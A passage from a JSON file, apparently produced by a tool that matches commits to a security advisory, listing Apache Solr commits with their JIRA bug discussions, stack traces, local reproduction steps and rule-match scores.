try with your change and see if I can confirm that the field is still removed like it's supposed to be, although it's a bit difficult to test because it's not reliably reproducible, and I'll have to catch it after it would have happened and before some other later update of the same document hasn't possibly set the field that was nulled to a non-null value, which may rely some luck. I compared the effect of if (values == null ) continue ; versus calling addField with null like I had, and I wasn't able to observe any different outcome. In both cases, the old field values that were requested to be removed by the earlier updates that included { \"set\" : null } were still processed successfully. Right after the update happened, but before the commitWithin window had passed, I would still see the old value when querying the /select endpoint, and using the{{ /get }}endpoint, I would not see the fields that were to have been removed, whether the later updates called addField with null or not. Once the commitWindow passed, then the /select endpoint correctly showed the documents had been updated as they should have been and the fields had been removed (and other expected changes were applied). So it seems that the newerDoc definitely doesn't need the null, and maybe it's not having any effect when it is present, as things seem to work the same in both cases as far as I can tell by inspecting the state of the documents in the index after it happens. I'll stick with the version Christine suggested that does continue while I'm testing. Thanks Calvin for testing and sharing your findings! Couple of thinking out alouds and curiosity if I may, again with the caveat that I'm not very familiar with the partial update functionality \u2013 about the puzzle of olderDoc.getFieldNames() returning the fieldName but then olderDoc.getFieldValues() returned no corresponding value(s) \u2013 wondering if the getFieldValues return value of null is due to the field being set to null somehow or the field not being set \u2013 ref: https://github.com/apache/lucene-solr/blob/releases/lucene-solr/8.11.2/solr/solrj/src/java/org/apache/solr/common/SolrInputDocument.java#L121-L127 (to the extent that you are able to share) what is the field schema/definition e.g. does type make a difference or if the field is required or if the field is defaulted or multiValued etc. about the sequence of events e.g. is it perhaps a case of a \"remove this field\" happening before there ever was an actual value for the field, or maybe there are two consecutive \"remove this field\" happenings, or variants on that theme in case of multiValued fields Context for my curiosity is sort of that if we understand more on how the name-but-no-value scenario arises then that could point to a different (complementary or alternative) code change and/or we might discover 'something else' also being unexpected. I can't share the full schema file or the docs unfortunately, and I'm a bit pressed for time at the moment, but here's what I was able to determine: - the 8 fields that the error occurs for in my most easily reproducible case are all single-valued (I only know it is 8 fields due to modifying the code to skip the null and print to stdout when the error would have happened); 7 of them are a 'lowercase' field type and the other is 'text_en_splitting_tight' (as those are defined in the default schema); I wouldn't read much into that though, as those are common field types in our schema - I was able to establish that all fields that the error would have happened for were not set in the doc version in the index (but this doesn't seem to matter, as I describe below), and all of them had a previous partial update in the same commitWithin window that set the field to null So, for example, if the original full doc in the index contained: { \"id\" : \"123\" , \"foo\" : \"bar\" ,\r\n\u00a0 \u00a0 ...\r\n} it did not contain a 'field1', 'field2', ..., 'field8'. Then there were multiple partial updates, one of which included: { \"id\" : \"123\" , \"foo\" : { \"set\" : \"baz\" }, \"field1\" : { \"set\" : null }, \"field2\" : { \"set\" : null },\r\n\u00a0 \u00a0 ... \"field8\" : { \"set\" : null }\r\n} and then after some other updates (of both doc \"123\", none of which set field1-field8), there was an update like: { \"id\" : \"123\" , \"differentfield1\" : { \"set\" : [\r\n\u00a0 \u00a0 \u00a0 \u00a0 348459\r\n\u00a0 \u00a0 \u00a0 ]\r\n\u00a0 \u00a0 }, \"differentfield2\" : { \"set\" : 2\r\n\u00a0 \u00a0 }\r\n} which does nothing with any of the field1-field8 , and the NullPointerException is thrown then because the older doc returns null for whichever of the field1-field8 is processed first. It doesn't appear to matter whether the document in the index originally has a value for field1-field8 or not though, as I was able to reproduce the problem with an identical stack trace even if all those fields had values originally. So to summarize, it doesn't matter if the field in the doc in the index originally has a value or not it happens when there was just 1 prior partial update that set the field to null there are other updates of other fields on that doc (and unrelated updates of other docs) in between the partial update that sets the field to null and the doc that causes the NullPointerException the update that causes the error included only updates to fields other than field1-field8 (the ones that were set to null in the earlier update) Also, since I didn't include the stack trace here, and I originally gave the stack trace as for version 8.11.2, here's the stack trace for 9.4.0, which is the version I've been using for most of my testing: 2024-01-19 18:33:10.160 ERROR (qtp726408598-34) [ x:app t:0.0.0.0-34] o.a.s.s.HttpSolrCall 500 Exception => java.lang.NullPointerException\r\n\u00a0 \u00a0 at org.apache.solr.update.UpdateLog.applyOlderUpdates(UpdateLog.java:1025)\r\njava.lang.NullPointerException: null\r\n\u00a0 \u00a0 at org.apache.solr.update.UpdateLog.applyOlderUpdates(UpdateLog.java:1025) ~[?:?]\r\n\u00a0 \u00a0 at org.apache.solr.update.UpdateLog.applyPartialUpdates(UpdateLog.java:992) ~[?:?]\r\n\u00a0 \u00a0 at org.apache.solr.handler.component.RealTimeGetComponent.resolveFullDocument(RealTimeGetComponent.java:476) ~[?:?]\r\n\u00a0 \u00a0 at org.apache.solr.handler.component.RealTimeGetComponent.getInputDocumentFromTlog(RealTimeGetComponent.java:720) ~[?:?]\r\n\u00a0 \u00a0 at org.apache.solr.handler.component.RealTimeGetComponent.getInputDocumentFromTlog(RealTimeGetComponent.java:657) ~[?:?]\r\n\u00a0 \u00a0 at org.apache.solr.handler.component.RealTimeGetComponent.getInputDocument(RealTimeGetComponent.java:773) ~[?:?]\r\n\u00a0 \u00a0 at org.apache.solr.update.processor.DistributedUpdateProcessor.getUpdatedDocument(DistributedUpdateProcessor.java:788) ~[?:?]\r\n\u00a0 \u00a0 at org.apache.solr.update.processor.DistributedUpdateProcessor.doVersionAdd(DistributedUpdateProcessor.java:406) ~[?:?]\r\n\u00a0 \u00a0 at org.apache.solr.update.processor.DistributedUpdateProcessor.lambda$versionAdd$0(DistributedUpdateProcessor.java:356) ~[?:?]\r\n\u00a0 \u00a0 at org.apache.solr.update.VersionBucket.runWithLock(VersionBucket.java:51) ~[?:?]\r\n\u00a0 \u00a0 at org.apache.solr.update.processor.DistributedUpdateProcessor.versionAdd(DistributedUpdateProcessor.java:353) ~[?:?]\r\n\u00a0 \u00a0 at org.apache.solr.update.processor.DistributedUpdateProcessor.processAdd(DistributedUpdateProcessor.java:234) ~[?:?]\r\n\u00a0 \u00a0 at org.apache.solr.update.processor.LogUpdateProcessorFactory$LogUpdateProcessor.processAdd(LogUpdateProcessorFactory.java:111) ~[?:?]\r\n\u00a0 \u00a0 at org.apache.solr.handler.loader.JsonLoader$SingleThreadedJsonLoader.handleAdds(JsonLoader.java:553) ~[?:?]\r\n\u00a0 \u00a0 at org.apache.solr.handler.loader.JsonLoader$SingleThreadedJsonLoader.processUpdate(JsonLoader.java:183) ~[?:?]\r\n\u00a0 \u00a0 at org.apache.solr.handler.loader.JsonLoader$SingleThreadedJsonLoader.load(JsonLoader.java:151) ~[?:?]\r\n\u00a0 \u00a0 at org.apache.solr.handler.loader.JsonLoader.load(JsonLoader.java:86) ~[?:?]\r\n\u00a0 \u00a0 at org.apache.solr.handler.UpdateRequestHandler$1.load(UpdateRequestHandler.java:102) ~[?:?]\r\n\u00a0 \u00a0 at org.apache.solr.handler.ContentStreamHandlerBase.handleRequestBody(ContentStreamHandlerBase.java:100) ~[?:?]\r\n\u00a0 \u00a0 at org.apache.solr.handler.RequestHandlerBase.handleRequest(RequestHandlerBase.java:226) ~[?:?]\r\n\u00a0 \u00a0 at org.apache.solr.core.SolrCore.execute(SolrCore.java:2901) ~[?:?]\r\n\u00a0 \u00a0 at org.apache.solr.servlet.HttpSolrCall.executeCoreRequest(HttpSolrCall.java:875) ~[?:?]\r\n\u00a0 \u00a0 at org.apache.solr.servlet.HttpSolrCall.call(HttpSolrCall.java:561) ~[?:?]\r\n\u00a0 \u00a0 at org.apache.solr.servlet.SolrDispatchFilter.dispatch(SolrDispatchFilter.java:262) ~[?:?]\r\n\u00a0 \u00a0 at org.apache.solr.servlet.SolrDispatchFilter.lambda$doFilter$0(SolrDispatchFilter.java:219) ~[?:?]\r\n\u00a0 \u00a0 at org.apache.solr.servlet.ServletUtils.traceHttpRequestExecution2(ServletUtils.java:246) ~[?:?]\r\n\u00a0 \u00a0 at org.apache.solr.servlet.ServletUtils.rateLimitRequest(ServletUtils.java:215) ~[?:?]\r\n\u00a0 \u00a0 at org.apache.solr.servlet.SolrDispatchFilter.doFilter(SolrDispatchFilter.java:213) ~[?:?]\r\n\u00a0 \u00a0 at org.apache.solr.servlet.SolrDispatchFilter.doFilter(SolrDispatchFilter.java:195) ~[?:?]\r\n\u00a0 \u00a0 at org.eclipse.jetty.servlet.FilterHolder.doFilter(FilterHolder.java:210) ~[jetty-servlet-10.0.17.jar:10.0.17]\r\n\u00a0 \u00a0 at org.eclipse.jetty.servlet.ServletHandler$Chain.doFilter(ServletHandler.java:1635) ~[jetty-servlet-10.0.17.jar:10.0.17]\r\n\u00a0 \u00a0 at org.eclipse.jetty.servlet.ServletHandler.doHandle(ServletHandler.java:527) ~[jetty-servlet-10.0.17.jar:10.0.17]\r\n\u00a0 \u00a0 at org.eclipse.jetty.server.handler.ScopedHandler.handle(ScopedHandler.java:131) ~[jetty-server-10.0.17.jar:10.0.17]\r\n\u00a0 \u00a0 at org.eclipse.jetty.security.SecurityHandler.handle(SecurityHandler.java:598) ~[jetty-security-10.0.17.jar:10.0.17]\r\n\u00a0 \u00a0 at org.eclipse.jetty.server.handler.HandlerWrapper.handle(HandlerWrapper.java:122) ~[jetty-server-10.0.17.jar:10.0.17]\r\n\u00a0 \u00a0 at org.eclipse.jetty.server.handler.ScopedHandler.nextHandle(ScopedHandler.java:223) ~[jetty-server-10.0.17.jar:10.0.17]\r\n\u00a0 \u00a0 at org.eclipse.jetty.server.session.SessionHandler.doHandle(SessionHandler.java:1570) ~[jetty-server-10.0.17.jar:10.0.17]\r\n\u00a0 \u00a0 at org.eclipse.jetty.server.handler.ScopedHandler.nextHandle(ScopedHandler.java:221) ~[jetty-server-10.0.17.jar:10.0.17]\r\n\u00a0 \u00a0 at org.eclipse.jetty.server.handler.ContextHandler.doHandle(ContextHandler.java:1384) ~[jetty-server-10.0.17.jar:10.0.17]\r\n\u00a0 \u00a0 at org.eclipse.jetty.server.handler.ScopedHandler.nextScope(ScopedHandler.java:176) ~[jetty-server-10.0.17.jar:10.0.17]\r\n\u00a0 \u00a0 at org.eclipse.jetty.servlet.ServletHandler.doScope(ServletHandler.java:484) ~[jetty-servlet-10.0.17.jar:10.0.17]\r\n\u00a0 \u00a0 at org.eclipse.jetty.server.session.SessionHandler.doScope(SessionHandler.java:1543) ~[jetty-server-10.0.17.jar:10.0.17]\r\n\u00a0 \u00a0 at org.eclipse.jetty.server.handler.ScopedHandler.nextScope(ScopedHandler.java:174) ~[jetty-server-10.0.17.jar:10.0.17]\r\n\u00a0 \u00a0 at org.eclipse.jetty.server.handler.ContextHandler.doScope(ContextHandler.java:1306) ~[jetty-server-10.0.17.jar:10.0.17]\r\n\u00a0 \u00a0 at org.eclipse.jetty.server.handler.ScopedHandler.handle(ScopedHandler.java:129) ~[jetty-server-10.0.17.jar:10.0.17]\r\n\u00a0 \u00a0 at org.eclipse.jetty.server.handler.ContextHandlerCollection.handle(ContextHandlerCollection.java:149) ~[jetty-server-10.0.17.jar:10.0.17]\r\n\u00a0 \u00a0 at org.eclipse.jetty.server.handler.InetAccessHandler.handle(InetAccessHandler.java:228) ~[jetty-server-10.0.17.jar:10.0.17]\r\n\u00a0 \u00a0 at org.eclipse.jetty.server.handler.HandlerCollection.handle(HandlerCollection.java:141) ~[jetty-server-10.0.17.jar:10.0.17]\r\n\u00a0 \u00a0 at org.eclipse.jetty.server.handler.HandlerWrapper.handle(HandlerWrapper.java:122) ~[jetty-server-10.0.17.jar:10.0.17]\r\n\u00a0 \u00a0 at org.eclipse.jetty.rewrite.handler.RewriteHandler.handle(RewriteHandler.java:301) ~[jetty-rewrite-10.0.17.jar:10.0.17]\r\n\u00a0 \u00a0 at org.eclipse.jetty.server.handler.HandlerWrapper.handle(HandlerWrapper.java:122) ~[jetty-server-10.0.17.jar:10.0.17]\r\n\u00a0 \u00a0 at org.eclipse.jetty.server.handler.gzip.GzipHandler.handle(GzipHandler.java:822) ~[jetty-server-10.0.17.jar:10.0.17]\r\n\u00a0 \u00a0 at org.eclipse.jetty.server.handler.HandlerWrapper.handle(HandlerWrapper.java:122) ~[jetty-server-10.0.17.jar:10.0.17]\r\n\u00a0 \u00a0 at org.eclipse.jetty.server.Server.handle(Server.java:563) ~[jetty-server-10.0.17.jar:10.0.17]\r\n\u00a0 \u00a0 at org.eclipse.jetty.server.HttpChannel$RequestDispatchable.dispatch(HttpChannel.java:1598) ~[jetty-server-10.0.17.jar:10.0.17]\r\n\u00a0 \u00a0 at org.eclipse.jetty.server.HttpChannel.dispatch(HttpChannel.java:753) ~[jetty-server-10.0.17.jar:10.0.17]\r\n\u00a0 \u00a0 at org.eclipse.jetty.server.HttpChannel.handle(HttpChannel.java:501) ~[jetty-server-10.0.17.jar:10.0.17]\r\n\u00a0 \u00a0 at org.eclipse.jetty.server.HttpConnection.onFillable(HttpConnection.java:287) ~[jetty-server-10.0.17.jar:10.0.17]\r\n\u00a0 \u00a0 at org.eclipse.jetty.io.AbstractConnection$ReadCallback.succeeded(AbstractConnection.java:314) ~[jetty-io-10.0.17.jar:10.0.17]\r\n\u00a0 \u00a0 at org.eclipse.jetty.io.FillInterest.fillable(FillInterest.java:100) ~[jetty-io-10.0.17.jar:10.0.17]\r\n\u00a0 \u00a0 at org.eclipse.jetty.io.SelectableChannelEndPoint$1.run(SelectableChannelEndPoint.java:53) ~[jetty-io-10.0.17.jar:10.0.17]\r\n\u00a0 \u00a0 at org.eclipse.jetty.util.thread.strategy.AdaptiveExecutionStrategy.runTask(AdaptiveExecutionStrategy.java:421) ~[jetty-util-10.0.17.jar:10.0.17]\r\n\u00a0 \u00a0 at org.eclipse.jetty.util.thread.strategy.AdaptiveExecutionStrategy.consumeTask(AdaptiveExecutionStrategy.java:390) ~[jetty-util-10.0.17.jar:10.0.17]\r\n\u00a0 \u00a0 at org.eclipse.jetty.util.thread.strategy.AdaptiveExecutionStrategy.tryProduce(AdaptiveExecutionStrategy.java:277) ~[jetty-util-10.0.17.jar:10.0.17]\r\n\u00a0 \u00a0 at org.eclipse.jetty.util.thread.strategy.AdaptiveExecutionStrategy.run(AdaptiveExecutionStrategy.java:199) ~[jetty-util-10.0.17.jar:10.0.17]\r\n\u00a0 \u00a0 at org.eclipse.jetty.util.thread.ReservedThreadExecutor$ReservedThread.run(ReservedThreadExecutor.java:411) ~[jetty-util-10.0.17.jar:10.0.17]\r\n\u00a0 \u00a0 at org.eclipse.jetty.util.thread.QueuedThreadPool.runJob(QueuedThreadPool.java:969) ~[jetty-util-10.0.17.jar:10.0.17]\r\n\u00a0 \u00a0 at org.eclipse.jetty.util.thread.QueuedThreadPool$Runner.doRunJob(QueuedThreadPool.java:1194) ~[jetty-util-10.0.17.jar:10.0.17]\r\n\u00a0 \u00a0 at org.eclipse.jetty.util.thread.QueuedThreadPool$Runner.run(QueuedThreadPool.java:1149) ~[jetty-util-10.0.17.jar:10.0.17]\r\n\u00a0 \u00a0 at java.lang.Thread.run(Thread.java:829) [?:?] Thanks again for your help. Thanks Calvin for all the info above! Based on the info above, I was able to reproduce the NPE locally by adding two extra fields to the films example considering the https://solr.apache.org/guide/solr/latest/indexing-guide/partial-document-updates.html#in-place-updates info, and by making /get calls that exercise the code paths in question. Will attach the script to this JIRA item. Having read more of the code in the process and also noting the https://github.com/apache/solr/blob/releases/solr/9.4.1/solr/core/src/java/org/apache/solr/update/UpdateLog.java#L1017 comment which reads /** Add all fields from olderDoc into newerDoc if not already present in newerDoc */ I'm now then inclined to think that your original solution with the newerDoc.addField(fieldName, null); is preferable. Would you like to open a pull request for the change, for main branch? Hi cpoerschke , casmith - thanks for all your work so far figuring this out!  (I agree with Christine - one of the best JIRA writeups I've seen lately!) I don't have much context here, but stumbled across this ticket in preparing for the upcoming 9.5.0 release.  I see it's not marked as a \"Blocker\", but the Fix-Version is 9.5?  Is this high-impact enough that it should be a Blocker, or is it not worth holding up the 9.5 RC for?  My tentative target for RC1 was this Thursday the 25th or Friday the 26th. Thanks for clarifying! Hi cpoerschke , that's great that you were able to reproduce it. I'll start a pull request. Hi gerlowskija , I don't know how the project decides on what's a blocker or not, but imho, it would be nice to get it in 9.5 if practical, but it shouldn't block the release, because it's not a regression or something that is likely to affect many users (I was able to reproduce it back as far as version 6.6.2 (as far back as I checked), but have never run into it through years of the same kinds of activity (at lower update rates) as triggers the exception). I created a pull request: https://github.com/apache/solr/pull/2214 The s3 tests failed for me. I've tried getting rid of my existing ~/.aws/config and ~/.aws/credentials files in case there was anything unexpected in there, since the error seemed to be the same as one other people were getting when there were issues with one of those confs. EDIT: All the tests did pass after I renamed my aws config files, so there must have been something in them that the java sdk didn't tolerate but was okay for the aws cli and the python sdk that I usually use. Commit 571c8871278bc14aea683420aea58ef64e38bbae in solr's branch refs/heads/main from Calvin Smith [ https://gitbox.apache.org/repos/asf?p=solr.git;h=571c8871278 ] SOLR-17120 : handle null value when merging partials (#2214) SOLR-17120 handle null value when merging partials this change avoids a `NullPointerException` that can occur under some circumstances when performing multiple partial updates of the same document Commit e0ce8f60da8c97a765f598e9ee36438715e964f7 in solr's branch refs/heads/branch_9x from Calvin Smith [ https://gitbox.apache.org/repos/asf?p=solr.git;h=e0ce8f60da8 ] SOLR-17120 : handle null value when merging partials (#2214) SOLR-17120 handle null value when merging partials this change avoids a `NullPointerException` that can occur under some circumstances when performing multiple partial updates of the same document (cherry picked from commit 571c8871278bc14aea683420aea58ef64e38bbae) Commit 0de8d70df0f2b5482ada41fb4479f74cda4c0d76 in solr's branch refs/heads/branch_9_5 from Calvin Smith [ https://gitbox.apache.org/repos/asf?p=solr.git;h=0de8d70df0f ] SOLR-17120 : handle null value when merging partials (#2214) SOLR-17120 handle null value when merging partials this change avoids a `NullPointerException` that can occur under some circumstances when performing multiple partial updates of the same document (cherry picked from commit 571c8871278bc14aea683420aea58ef64e38bbae) (cherry picked from commit e0ce8f60da8c97a765f598e9ee36438715e964f7) Thanks casmith ! My pleasure. Thank you cpoerschke for all your help and for getting this into main so quickly. Commit 78e618444690b9ddf285e416d8045a11dceb711b in lucene-solr's branch refs/heads/branch_8_11 from Christine Poerschke [ https://gitbox.apache.org/repos/asf?p=lucene-solr.git;h=78e61844469 ] SOLR-17120 : handle null value when merging partials (backport of solr#2214) (#2683) SOLR-17120 handle null value when merging partials this change avoids a `NullPointerException` that can occur under some circumstances when performing multiple partial updates of the same document Co-authored-by: Calvin Smith <eukaryote@users.noreply.github.com> https://github.com/apache/lucene-solr/pull/2683 as per above backported for the upcoming (as per https://lists.apache.org/thread/6vl1t5bmqqym2w3kgvrdb7f71njc1moc mailing list thread) 8.11.3 release too. Commit 571c8871278bc14aea683420aea58ef64e38bbae in solr's branch refs/heads/jira/ SOLR-16858 from Calvin Smith [ https://gitbox.apache.org/repos/asf?p=solr.git;h=571c8871278 ] SOLR-17120 : handle null value when merging partials (#2214) SOLR-17120 handle null value when merging partials this change avoids a `NullPointerException` that can occur under some circumstances when performing multiple partial updates of the same document Closing after the 8.11.3 release"
            },
            "ghissue_refs": {
                "2214": "",
                "2683": ""
            },
            "cve_refs": [],
            "twins": [],
            "tags": [
                "releases/lucene-solr/8.11.3"
            ],
            "matched_rules": [
                {
                    "id": "CHANGES_RELEVANT_CODE",
                    "message": "The commit modifies code containing relevant filename or methods: Solr",
                    "relevance": 8
                },
                {
                    "id": "CHANGES_RELEVANT_FILES",
                    "message": "The commit changes some relevant files: solr/core/src/java/org/apache/solr/update/UpdateLog.java",
                    "relevance": 8
                },
                {
                    "id": "ADV_KEYWORDS_IN_MSG",
                    "message": "The commit message and the advisory description contain the following keywords: value, user",
                    "relevance": 4
                },
                {
                    "id": "BUG_IN_MESSAGE",
                    "message": "The commit message references some bug tracking ticket: SOLR-17120",
                    "relevance": 2
                },
                {
                    "id": "GITHUB_ISSUE_IN_MESSAGE",
                    "message": "The commit message references some github issue: 2214, 2683",
                    "relevance": 2
                }
            ]
        },
        {
            "commit_id": "49fd000432e7cbe62551141e474b4bec3243fe39",
            "repository": "https://github.com/apache/lucene-solr",
            "timestamp": 1665748954,
            "hunks": 2,
            "message": "SOLR-16451: Don't fetch the PRS states while registering the collection watch closes #1057",
            "changed_files": [
                "solr/solrj/src/java/org/apache/solr/common/cloud/ZkStateReader.java"
            ],
            "message_reference_content": [],
            "jira_refs": {
                "SOLR-16451": "Solr fetches prs state inside watch registration here https://github.com/apache/solr/blob/19f109842fb34069346a9efb21cf01b6706830a8/solr/solrj-zookeeper/src/java/org/apache/solr/common/cloud/ZkStateReader.java#L1857 which is un necessary, and it affects the perf PRS: Don't fetch the prs state, while registering the collection watch CCing noblepaul ichattopadhyaya Commit 3046236e6ec8875d54c512fa69a1c89be430b909 in solr's branch refs/heads/main from Ishan Chattopadhyaya [ https://gitbox.apache.org/repos/asf?p=solr.git;h=3046236e6ec ] SOLR-16451 : Don't fetch the PRS states while registering the collection watch closes #1057 Commit 13834cca4c019ec04f32c2daa18770674de038ed in solr's branch refs/heads/branch_9x from Ishan Chattopadhyaya [ https://gitbox.apache.org/repos/asf?p=solr.git;h=13834cca4c0 ] SOLR-16451 : Don't fetch the PRS states while registering the collection watch closes #1057 Commit d4bddbb80cc5baabdd8806cf9bb417b4e4a83f83 in solr's branch refs/heads/branch_9_1 from Ishan Chattopadhyaya [ https://gitbox.apache.org/repos/asf?p=solr.git;h=d4bddbb80cc ] SOLR-16451 : Don't fetch the PRS states while registering the collection watch closes #1057 Thanks hiteshkhamesra . Thanks. we may want to remove unused function https://github.com/apache/solr/blob/8789520fb13a9b1736d030aefd48dde1fe22bc82/solr/solrj-zookeeper/src/java/org/apache/solr/common/cloud/ZkStateReader.java#L1862 Commit c54ed38cb977fa0515e502c50916ab1c2b2102fc in solr's branch refs/heads/main from Noble Paul [ https://gitbox.apache.org/repos/asf?p=solr.git;h=c54ed38cb97 ] SOLR-16451 : removed unused method Commit 65f05ef768a4a64142bf1b7b8eddcc2e0f923b29 in solr's branch refs/heads/branch_9x from Noble Paul [ https://gitbox.apache.org/repos/asf?p=solr.git;h=65f05ef768a ] SOLR-16451 : removed unused method Commit 52c587211685dfa8a6eb487b5b6861f41f63ac4f in solr's branch refs/heads/branch_9_1 from Noble Paul [ https://gitbox.apache.org/repos/asf?p=solr.git;h=52c58721168 ] SOLR-16451 : removed unused method Bulk closing 9.1 issues. Commit 49fd000432e7cbe62551141e474b4bec3243fe39 in lucene-solr's branch refs/heads/branch_8_11 from Ishan Chattopadhyaya [ https://gitbox.apache.org/repos/asf?p=lucene-solr.git;h=49fd000432e ] SOLR-16451 : Don't fetch the PRS states while registering the collection watch closes #1057"
            },
            "ghissue_refs": {
                "1057": ""
            },
            "cve_refs": [],
            "twins": [],
            "tags": [
                "releases/lucene-solr/8.11.3"
            ],
            "matched_rules": [
                {
                    "id": "CHANGES_RELEVANT_CODE",
                    "message": "The commit modifies code containing relevant filename or methods: Solr",
                    "relevance": 8
                },
                {
                    "id": "CHANGES_RELEVANT_FILES",
                    "message": "The commit changes some relevant files: solr/solrj/src/java/org/apache/solr/common/cloud/ZkStateReader.java",
                    "relevance": 8
                },
                {
                    "id": "ADV_KEYWORDS_IN_FILES",
                    "message": "An advisory keyword is contained in the changed files: read",
                    "relevance": 4
                },
                {
                    "id": "BUG_IN_MESSAGE",
                    "message": "The commit message references some bug tracking ticket: SOLR-16451",
                    "relevance": 2
                },
                {
                    "id": "GITHUB_ISSUE_IN_MESSAGE",
                    "message": "The commit message references some github issue: 1057",
                    "relevance": 2
                }
            ]
        },
        {
            "commit_id": "7bd8229f4db031f81b84e15881a483244967a8e1",
            "repository": "https://github.com/apache/lucene-solr",
            "timestamp": 1651770069,
            "hunks": 4,
            "message": "SOLR-16110: Using Schema/Config API breaks the File-Upload of Config Set File (#831) Co-authored-by: Steffen Moldenhauer <s.moldenhauer@intershop.de>",
            "changed_files": [
                "solr/core/src/java/org/apache/solr/cloud/ZkController.java"
            ],
            "message_reference_content": [],
            "jira_refs": {
                "SOLR-16110": "After using the Schema/Config API to change the config/schema in a config set, the UPLOAD of a file to this config set does not work anymore. The Schema/Config API changes the metadata that is stored at the config set node. There is a '{trusted=false}' / '{trusted=true} or an empty \"no utf8 Content\" but after the Schema/Config API call it is\u00a0 replaced by a single 0 byte. As a result the following upload of a file with Configset API throws a json parse error. Steps to reproduce Run solr cloud example:\u00a0 solr -e cloud -p 8984 Create Config set from _default: http://localhost:8984/solr/admin/configs?action=CREATE&name=test&baseName=_default Create Collection with Config set 'test': http://localhost:8984/solr/admin/collections?action=CREATE&name=test&collection.configName=test&numShards=1 add field with Schema API call: curl -X POST -H 'Content-Type: application/json' -i http: //localhost:8984/solr/test/schema --data '{ \"add-field\" :{ \"name\" : \"my-field\" , \"type\" : \"string\" , \"stored\" : true }\r\n}' Create a file test.json and try to upload it: curl -X POST --header \"Content-Type:application/json\" --data-binary @test.json \"http: //localhost:8983/solr/admin/configs?action=UPLOAD&name=test&filePath=test.json&wt=xml&omitHeader= true \" Response: <?xml version= \"1.0\" encoding= \"UTF-8\" ?>\r\n<response><lst name= \"error\" >\r\n\u00a0 <str name= \"msg\" >JSON Parse Error: char =#0;,position=0 AFTER= '#0;' BEFORE=''</str>\r\n\u00a0 <str name= \"trace\" >org.noggit.JSONParser$ParseException: JSON Parse Error: char =#0;,position=0 AFTER= '#0;' BEFORE=''\r\n\u00a0 \u00a0 \u00a0 \u00a0 at org.noggit.JSONParser.err(JSONParser.java:452)\r\n\u00a0 \u00a0 \u00a0 \u00a0 at org.noggit.JSONParser.handleNonDoubleQuoteString(JSONParser.java:819)\r\n\u00a0 \u00a0 \u00a0 \u00a0 at org.noggit.JSONParser.next(JSONParser.java:1026)\r\n\u00a0 \u00a0 \u00a0 \u00a0 at org.noggit.JSONParser.nextEvent(JSONParser.java:1073)\r\n\u00a0 \u00a0 \u00a0 \u00a0 at org.noggit.ObjectBuilder.&lt;init&gt;(ObjectBuilder.java:84)\r\n\u00a0 \u00a0 \u00a0 \u00a0 at org.apache.solr.common.util.Utils.lambda$ static $1(Utils.java:356)\r\n\u00a0 \u00a0 \u00a0 \u00a0 at org.apache.solr.common.util.Utils.fromJSON(Utils.java:319)\r\n\u00a0 \u00a0 \u00a0 \u00a0 at org.apache.solr.common.util.Utils.fromJSON(Utils.java:305)\r\n\u00a0 \u00a0 \u00a0 \u00a0 at org.apache.solr.handler.admin.ConfigSetsHandler.isCurrentlyTrusted(ConfigSetsHandler.java:328)\r\n\u00a0 \u00a0 \u00a0 \u00a0 at org.apache.solr.handler.admin.ConfigSetsHandler.ensureOverwritingUntrustedConfigSet(ConfigSetsHandler.java:308)\r\n\u00a0 \u00a0 \u00a0 \u00a0 at org.apache.solr.handler.admin.ConfigSetsHandler.createBaseZnode(ConfigSetsHandler.java:269)\r\n\u00a0 \u00a0 \u00a0 \u00a0 at org.apache.solr.handler.admin.ConfigSetsHandler.handleConfigUploadRequest(ConfigSetsHandler.java:205)\r\n\u00a0 \u00a0 \u00a0 \u00a0 at org.apache.solr.handler.admin.ConfigSetsHandler.handleRequestBody(ConfigSetsHandler.java:113)\r\n\u00a0 \u00a0 \u00a0 \u00a0 at org.apache.solr.handler.RequestHandlerBase.handleRequest(RequestHandlerBase.java:216)\r\n\u00a0 \u00a0 \u00a0 \u00a0 at org.apache.solr.servlet.HttpSolrCall.handleAdmin(HttpSolrCall.java:836)\r\n\u00a0 \u00a0 \u00a0 \u00a0 at org.apache.solr.servlet.HttpSolrCall.handleAdminRequest(HttpSolrCall.java:800)\r\n\u00a0 \u00a0 \u00a0 \u00a0 at org.apache.solr.servlet.HttpSolrCall.call(HttpSolrCall.java:545)\r\n\u00a0 \u00a0 \u00a0 \u00a0 at org.apache.solr.servlet.SolrDispatchFilter.doFilter(SolrDispatchFilter.java:427)\r\n\u00a0 \u00a0 \u00a0 \u00a0 at org.apache.solr.servlet.SolrDispatchFilter.doFilter(SolrDispatchFilter.java:357)\r\n\u00a0 \u00a0 \u00a0 \u00a0 at org.eclipse.jetty.servlet.FilterHolder.doFilter(FilterHolder.java:201)\r\n\u00a0 \u00a0 \u00a0 \u00a0 at org.eclipse.jetty.servlet.ServletHandler$Chain.doFilter(ServletHandler.java:1601)\r\n\u00a0 \u00a0 \u00a0 \u00a0 at org.eclipse.jetty.servlet.ServletHandler.doHandle(ServletHandler.java:548)\r\n\u00a0 \u00a0 \u00a0 \u00a0 at org.eclipse.jetty.server.handler.ScopedHandler.handle(ScopedHandler.java:143)\r\n\u00a0 \u00a0 \u00a0 \u00a0 at org.eclipse.jetty.security.SecurityHandler.handle(SecurityHandler.java:600)\r\n\u00a0 \u00a0 \u00a0 \u00a0 at org.eclipse.jetty.server.handler.HandlerWrapper.handle(HandlerWrapper.java:127)\r\n\u00a0 \u00a0 \u00a0 \u00a0 at org.eclipse.jetty.server.handler.ScopedHandler.nextHandle(ScopedHandler.java:235)\r\n\u00a0 \u00a0 \u00a0 \u00a0 at org.eclipse.jetty.server.session.SessionHandler.doHandle(SessionHandler.java:1624)\r\n\u00a0 \u00a0 \u00a0 \u00a0 at org.eclipse.jetty.server.handler.ScopedHandler.nextHandle(ScopedHandler.java:233)\r\n\u00a0 \u00a0 \u00a0 \u00a0 at org.eclipse.jetty.server.handler.ContextHandler.doHandle(ContextHandler.java:1434)\r\n\u00a0 \u00a0 \u00a0 \u00a0 at org.eclipse.jetty.server.handler.ScopedHandler.nextScope(ScopedHandler.java:188)\r\n\u00a0 \u00a0 \u00a0 \u00a0 at org.eclipse.jetty.servlet.ServletHandler.doScope(ServletHandler.java:501)\r\n\u00a0 \u00a0 \u00a0 \u00a0 at org.eclipse.jetty.server.session.SessionHandler.doScope(SessionHandler.java:1594)\r\n\u00a0 \u00a0 \u00a0 \u00a0 at org.eclipse.jetty.server.handler.ScopedHandler.nextScope(ScopedHandler.java:186)\r\n\u00a0 \u00a0 \u00a0 \u00a0 at org.eclipse.jetty.server.handler.ContextHandler.doScope(ContextHandler.java:1349)\r\n\u00a0 \u00a0 \u00a0 \u00a0 at 